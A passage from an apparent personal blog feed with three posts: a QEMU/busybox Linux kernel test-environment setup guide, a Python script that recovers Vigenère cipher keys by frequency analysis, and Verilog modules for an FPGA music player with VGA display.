class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _install</span><br><span class="line">$ <span class="built_in">mkdir</span> proc</span><br><span class="line">$ <span class="built_in">mkdir</span> sys</span><br><span class="line">$ <span class="built_in">touch</span> init</span><br><span class="line">$ <span class="built_in">chmod</span> +x init</span><br><span class="line">$ <span class="built_in">cat</span> init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="comment"># insmod /xxx.ko # load ko</span></span><br><span class="line">mdev -s <span class="comment"># We need this to find /dev/sda later</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"><span class="comment"># exec /bin/sh #root</span></span><br><span class="line"></span><br><span class="line">// By the way, write a <span class="built_in">test</span> <span class="keyword">case</span> and put it <span class="keyword">in</span> _install</span><br><span class="line">$ <span class="built_in">touch</span> test.c</span><br><span class="line">$ <span class="built_in">cat</span> test.c</span><br><span class="line">// gcc test.c -static -o <span class="built_in">test</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">syscall(1337);</span><br><span class="line"><span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test.c -static -o <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">//  Write a script to package rootfs.img</span><br><span class="line">$ <span class="built_in">cd</span> ../../</span><br><span class="line">$ <span class="built_in">touch</span> makeimg</span><br><span class="line">$ <span class="built_in">chmod</span> +x makeimg</span><br><span class="line">$ <span class="built_in">cat</span> makeimg</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Generate rootfs.img&quot;</span></span><br><span class="line"><span class="built_in">cd</span> busybox-x.xx.x/_install</span><br><span class="line">find . | cpio -o --format=newc &gt; ../../rootfs.img</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">busybox-x.xx.x  linux-x.x.x qemu-x.xx.x makeimg</span><br><span class="line"></span><br><span class="line">$ ./makeimg</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">busybox-x.xx.x  linux-x.x.x qemu-x.xx.x makeimg rootfs.img</span><br></pre></td></tr></table></figure><h2 id="Install-qumu"><a href="#Install-qumu" class="headerlink" title="Install qumu"></a>Install qumu</h2><p>Here using source code compilation</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-4.1.0.tar.xz</span><br><span class="line">tar xvJf qemu-4.1.0.tar.xz</span><br><span class="line"><span class="built_in">cd</span> qemu-4.1.0</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="qemu-boot"><a href="#qemu-boot" class="headerlink" title="qemu boot"></a>qemu boot</h2><p>Get a script from <a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">veritas501</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">busybox-x.xx.x  linux-x.x.x qemu-x.xx.x makeimg rootfs.img</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">touch</span> runqemu</span><br><span class="line">$ <span class="built_in">chmod</span> +x runqemu</span><br><span class="line">$ <span class="built_in">cat</span> runqemu</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel /home/test/test_kernel/linux-x.x.x/arch/x86/boot/bzImage \</span><br><span class="line">-initrd  /home/test/test_kernel/rootfs.img \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kalsr&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line"><span class="comment"># -gdb tcp::1234 \</span></span><br><span class="line"><span class="comment"># -S</span></span><br></pre></td></tr></table></figure><p>Run Script</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./runqemu</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/05/sOlqJfDTVvUkF6E.png" alt="1570264965223.png"></p><p>Done!</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">kernel环境配置</a></p><p>As well, thanks for MiGo and Aris’ guidance OWO</p><h2 id="Other-possible-problems"><a href="#Other-possible-problems" class="headerlink" title="Other possible problems"></a>Other possible problems</h2><p>Freely write</p><p>pkg-config  not  found </p><p>sudo apt-get install pkg-config</p><p>glib-2.40 gthread-2.0 is required to compile QEMU</p><p>Use <code>apt-cache search all | grep glib</code> to find glib, can find glib’s name is <code>libglib2.0-dev</code>, then <code>apt install libglib2.0-dev</code></p><p>ERROR: pixman &gt;&#x3D; 0.21.8 not present.<br>       Please install the pixman devel package.</p><p>Solution:<br>Use <code>apt-cache search pixman</code> to find, then <code>apt install libpixman-1-dev</code></p><p>Virtual machines remember to enable CPU virtualization</p><p>VNC server running on 127.0.0.1:5900</p><p>sudo apt-get install libsdl1.2-dev</p><p>sudo apt-get install gcc libsdl1.2-dev zlib1g-dev libasound2-dev pkg-config libgnutls-dev pciutils-dev</p><p>sudo apt-get install libsdl2-dev</p><p>sudo apt-get install libsdl2-2.0</p><p>sudo apt install libelf-dev</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Configuring kernel environment&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: No Key Virginia Encryption Crack</title>
    <link href="http://aslin.site/2022/03/09/backup-No-Key-Virginia-Encryption-Crack/"/>
    <id>http://aslin.site/2022/03/09/backup-No-Key-Virginia-Encryption-Crack/</id>
    <published>2022-03-09T00:58:18.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>A script to crack Virginia encryption without a password</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">fileName</span>):</span><br><span class="line">    file = <span class="built_in">open</span>(fileName,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    text = file.read()</span><br><span class="line">    file.close()</span><br><span class="line">    text = text.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charOffset</span>(<span class="params">char, offset</span>):</span><br><span class="line">    <span class="keyword">if</span>(offset &lt; <span class="number">0</span>):</span><br><span class="line">        offset += <span class="number">26</span></span><br><span class="line">    <span class="keyword">if</span> char.islower():</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">97</span> + offset) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="number">65</span> + offset) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Vigenere</span>(<span class="params">strIn, key, encode</span>):</span><br><span class="line">    strOut = <span class="string">&quot;&quot;</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> strIn:</span><br><span class="line">        <span class="keyword">if</span> c.isalpha():</span><br><span class="line">            offset = <span class="built_in">ord</span>(key[j % <span class="built_in">len</span>(key)]) - <span class="number">97</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> encode == <span class="literal">False</span>:</span><br><span class="line">                offset = -offset</span><br><span class="line">            strOut += charOffset(c, offset)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            strOut += c</span><br><span class="line">    <span class="keyword">return</span> strOut</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deVigenereAuto</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    best_key = <span class="string">&quot;&quot;</span></span><br><span class="line">    count = []</span><br><span class="line">    cipherMin = ciphertext.lower()</span><br><span class="line">    cipherMin = re.sub(<span class="string">&#x27;[^a-z]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, ciphertext.lower())</span><br><span class="line">    freq = [<span class="number">8.167</span>, <span class="number">1.492</span>, <span class="number">2.782</span>, <span class="number">4.253</span>, <span class="number">12.702</span>, <span class="number">2.228</span>, <span class="number">2.015</span>, <span class="number">6.094</span>, <span class="number">6.966</span>, <span class="number">0.153</span>, <span class="number">0.772</span>, <span class="number">4.025</span>, <span class="number">2.406</span>, <span class="number">6.749</span>, <span class="number">7.507</span>, <span class="number">1.929</span>, <span class="number">0.095</span>, <span class="number">5.987</span>, <span class="number">6.327</span>, <span class="number">9.056</span>, <span class="number">2.758</span>, <span class="number">0.978</span>, <span class="number">2.360</span>, <span class="number">0.150</span>, <span class="number">1.974</span>, <span class="number">0.074</span>];</span><br><span class="line">    <span class="keyword">for</span> best_len <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, best_len):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                count.append(<span class="number">0</span>)</span><br><span class="line">            i = j</span><br><span class="line">            <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(cipherMin):</span><br><span class="line">                count[<span class="built_in">ord</span>(cipherMin[i]) - <span class="number">97</span>] += <span class="number">1</span></span><br><span class="line">                i += best_len</span><br><span class="line">            ic = <span class="number">0</span></span><br><span class="line">            num = <span class="built_in">len</span>(cipherMin)/best_len</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(count)):</span><br><span class="line">                ic += math.<span class="built_in">pow</span>(count[i]/num, <span class="number">2</span>)</span><br><span class="line">            <span class="built_in">sum</span> += ic</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">sum</span>/best_len &gt; <span class="number">0.065</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, best_len):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            count[i] = <span class="number">0</span></span><br><span class="line">        i = j</span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(cipherMin):</span><br><span class="line">            count[<span class="built_in">ord</span>(cipherMin[i]) - <span class="number">97</span>] += <span class="number">1</span></span><br><span class="line">            i += best_len</span><br><span class="line">        max_dp = -<span class="number">1000000</span></span><br><span class="line">        best_i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">            cur_dp = <span class="number">0.0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">                cur_dp += freq[k] * count[(k + i) % <span class="number">26</span>]</span><br><span class="line">            <span class="keyword">if</span> cur_dp &gt; max_dp:</span><br><span class="line">                max_dp = cur_dp</span><br><span class="line">                best_i = i</span><br><span class="line">        best_key += <span class="built_in">chr</span>(best_i + <span class="number">97</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;best_key : &quot;</span> + best_key</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;plaintext : &quot;</span> + Vigenere(ciphertext, best_key, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ciphertext = openfile(<span class="string">&#x27;ciphertext2.txt&#x27;</span>)</span><br><span class="line">    a = raw_input(<span class="string">&quot;did you have key?(Y/N)&quot;</span>)</span><br><span class="line">    a = a.upper()</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;N&#x27;</span>:</span><br><span class="line">        deVigenereAuto(ciphertext)</span><br><span class="line">    <span class="keyword">if</span> a == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">        key = raw_input(<span class="string">&quot;key?&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;plaintext : &quot;</span> + Vigenere(ciphertext, key, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;A script to crack Virginia encryption without a password&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: Digital Circuit Course Design, Music Player with VGA Display</title>
    <link href="http://aslin.site/2022/03/09/backup-Digital-Circuit-Course-Design-Music-Player-with-VGA-Display/"/>
    <id>http://aslin.site/2022/03/09/backup-Digital-Circuit-Course-Design-Music-Player-with-VGA-Display/</id>
    <published>2022-03-09T00:41:25.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>Busy with digital circuit labs. It’s been a long time since I coded QAQ. Nothing coded recently, so I just pull up the digital electricity course design QWQ~</p><span id="more"></span><h3 id="Let’s-start-with-a-whole"><a href="#Let’s-start-with-a-whole" class="headerlink" title="Let’s start with a whole"></a>Let’s start with a whole</h3><p><img src="https://i.loli.net/2018/12/30/5c27a7bcebca8.png" alt="pic1"></p><p>This is the top of the whole project, and then it is separate to each module</p><h3 id="Phase-Locked-Loop-Crossover"><a href="#Phase-Locked-Loop-Crossover" class="headerlink" title="Phase-Locked Loop Crossover"></a>Phase-Locked Loop Crossover</h3><p><img src="https://i.loli.net/2018/12/30/5c27a87f2968d.png" alt="pic2"></p><p>This Phase-Locked Loop is used for dividing the frequency. My FPGA board is a Cyclone IV and comes with a 20MHz clock signal. The buzzer needs 1MHz, the music needs 4KHz, and the VGA display 640 * 480 * 60Hz needs 25MHz</p><h3 id="Music-Module"><a href="#Music-Module" class="headerlink" title="Music Module"></a>Music Module</h3><p> <img src="https://i.loli.net/2018/12/30/5c27a975b9b54.png" alt="pic3"></p><p>This is the music module, mainly divided into the number of notes recorded constep, recorded notes Rom, notes converted into buzzer frequency INX2CODE and sound SPK0</p><p>The constep is simply a counter that records the number of notes stored in the mif.</p><p>The ROM is needed to turn the score into a mif file and then use the ROM module to generate the device.</p><h4 id="INX2CODE"><a href="#INX2CODE" class="headerlink" title="INX2CODE"></a>INX2CODE</h4><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> INX2CODE (INX, F_CODE);</span><br><span class="line"><span class="keyword">input</span>[<span class="number">3</span>:<span class="number">0</span>] INX;</span><br><span class="line"><span class="keyword">output</span>[<span class="number">10</span>:<span class="number">0</span>] F_CODE;</span><br><span class="line"><span class="keyword">reg</span>[<span class="number">10</span>:<span class="number">0</span>] F_CODE;</span><br><span class="line"><span class="keyword">always</span> @(INX)</span><br><span class="line"><span class="keyword">case</span> (INX)</span><br><span class="line">  <span class="number">0</span> : F_CODE &lt;= <span class="number">11&#x27;H7FF</span>;</span><br><span class="line">  <span class="number">1</span> : F_CODE &lt;= <span class="number">11&#x27;H305</span>;</span><br><span class="line">  <span class="number">2</span> : F_CODE &lt;= <span class="number">11&#x27;H390</span>;</span><br><span class="line">  <span class="number">3</span> : F_CODE &lt;= <span class="number">11&#x27;H40C</span>;</span><br><span class="line">  <span class="number">4</span> : F_CODE &lt;= <span class="number">11&#x27;H45C</span>;</span><br><span class="line">  <span class="number">5</span> : F_CODE &lt;= <span class="number">11&#x27;H4AD</span>;</span><br><span class="line">  <span class="number">6</span> : F_CODE &lt;= <span class="number">11&#x27;H50A</span>;</span><br><span class="line">  <span class="number">7</span> : F_CODE &lt;= <span class="number">11&#x27;H55C</span>;</span><br><span class="line">  <span class="number">8</span> : F_CODE &lt;= <span class="number">11&#x27;H582</span>;</span><br><span class="line">  <span class="number">9</span> : F_CODE &lt;= <span class="number">11&#x27;H5C8</span>;</span><br><span class="line"> <span class="number">10</span> : F_CODE &lt;= <span class="number">11&#x27;H606</span>;</span><br><span class="line"> <span class="number">11</span> : F_CODE &lt;= <span class="number">11&#x27;H640</span>;</span><br><span class="line"> <span class="number">12</span> : F_CODE &lt;= <span class="number">11&#x27;H656</span>;</span><br><span class="line"> <span class="number">13</span> : F_CODE &lt;= <span class="number">11&#x27;H684</span>;</span><br><span class="line"> <span class="number">14</span> : F_CODE &lt;= <span class="number">11&#x27;H69A</span>;</span><br><span class="line"> <span class="number">15</span> : F_CODE &lt;= <span class="number">11&#x27;H6C0</span>;</span><br><span class="line"><span class="keyword">default</span> : F_CODE &lt;= <span class="number">11&#x27;H6C0</span>;</span><br><span class="line"><span class="keyword">endcase</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h4 id="SPK0"><a href="#SPK0" class="headerlink" title="SPK0"></a>SPK0</h4><p><img src="https://i.loli.net/2018/12/30/5c27b233d4217.png" alt="pic4"></p><h3 id="VGA-Driver"><a href="#VGA-Driver" class="headerlink" title="VGA Driver"></a>VGA Driver</h3><p><img src="https://i.loli.net/2018/12/30/5c27a975b7fd3.png" alt="pic5"></p><p>Convert the image to bmp format, then to mif, and save it to ROM like a note to generate a device.</p><h4 id="vga-driver"><a href="#vga-driver" class="headerlink" title="vga_driver"></a>vga_driver</h4><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> vga_driver(</span><br><span class="line">clk,</span><br><span class="line">hs,vs,</span><br><span class="line">r,g,b,</span><br><span class="line">rgbin,dout</span><br><span class="line">);</span><br><span class="line"><span class="keyword">input</span> clk;</span><br><span class="line"><span class="keyword">output</span> hs,vs;</span><br><span class="line"><span class="keyword">output</span> r,g,b;</span><br><span class="line"><span class="keyword">input</span> rgbin;</span><br><span class="line"><span class="keyword">output</span>[<span class="number">15</span>:<span class="number">0</span>] dout;</span><br><span class="line"><span class="keyword">reg</span>[<span class="number">9</span>:<span class="number">0</span>] hcnt,vcnt;</span><br><span class="line"><span class="keyword">reg</span> r,g,b;</span><br><span class="line"><span class="keyword">reg</span> hs,vs;</span><br><span class="line"><span class="keyword">assign</span> dout=&#123;vcnt[<span class="number">7</span>:<span class="number">0</span>],hcnt[<span class="number">7</span>:<span class="number">0</span>]&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">always</span> @(<span class="keyword">posedge</span> clk)</span><br><span class="line"><span class="keyword">if</span>(hcnt&lt;<span class="number">800</span>)</span><br><span class="line">hcnt&lt;=hcnt+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">hcnt&lt;=&#123;<span class="number">10</span>&#123;<span class="number">1&#x27;b0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">always</span> @(<span class="keyword">posedge</span> clk)</span><br><span class="line"><span class="keyword">if</span>(hcnt==<span class="number">640</span>+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">if</span>(vcnt&lt;<span class="number">525</span>)</span><br><span class="line">vcnt&lt;=vcnt+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">vcnt&lt;=&#123;<span class="number">10</span>&#123;<span class="number">1&#x27;b0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">always</span> @(<span class="keyword">posedge</span> clk)</span><br><span class="line"><span class="keyword">if</span>((hcnt&gt;=<span class="number">640</span>+<span class="number">8</span>+<span class="number">8</span>)&amp;(hcnt&lt;<span class="number">640</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">96</span>))</span><br><span class="line">hs&lt;=<span class="number">1&#x27;b0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">hs&lt;=<span class="number">1&#x27;b1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">always</span> @(vcnt)</span><br><span class="line"><span class="keyword">if</span>((vcnt&gt;=<span class="number">480</span>+<span class="number">8</span>+<span class="number">2</span>)&amp;(vcnt&lt;<span class="number">480</span>+<span class="number">8</span>+<span class="number">2</span>+<span class="number">2</span>))</span><br><span class="line">vs&lt;=<span class="number">1&#x27;b0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">vs&lt;=<span class="number">1&#x27;b1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">always</span> @(<span class="keyword">posedge</span> clk)</span><br><span class="line"><span class="keyword">if</span>(hcnt&lt;<span class="number">256</span>&amp;vcnt&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">r=rgbin;</span><br><span class="line">g=rgbin;</span><br><span class="line">b=rgbin;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">r=<span class="number">0</span>;</span><br><span class="line">g=<span class="number">0</span>;</span><br><span class="line">b=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure><h3 id="Selector"><a href="#Selector" class="headerlink" title="Selector"></a>Selector</h3><p><img src="https://i.loli.net/2018/12/30/5c27a975af3e6.png" alt="pic6"></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> choose2_1(</span><br><span class="line">EN,</span><br><span class="line">badapple,sakura,</span><br><span class="line">HS1,VS1,HS2,VS2,</span><br><span class="line">SPK1,SPK2,</span><br><span class="line">R1,R2,G1,G2,B1,B2,</span><br><span class="line">SPK,R,G,B,HS,VS</span><br><span class="line">);</span><br><span class="line"><span class="keyword">input</span> EN,badapple,sakura;</span><br><span class="line"><span class="keyword">input</span> HS1,VS1,HS2,VS2;</span><br><span class="line"><span class="keyword">input</span> SPK1,SPK2;</span><br><span class="line"><span class="keyword">input</span> R1,R2,B1,B2;</span><br><span class="line"><span class="keyword">input</span> G1,G2;</span><br><span class="line"><span class="keyword">output</span> SPK;</span><br><span class="line"><span class="keyword">output</span> HS,VS;</span><br><span class="line"><span class="keyword">output</span> R,B;</span><br><span class="line"><span class="keyword">output</span> 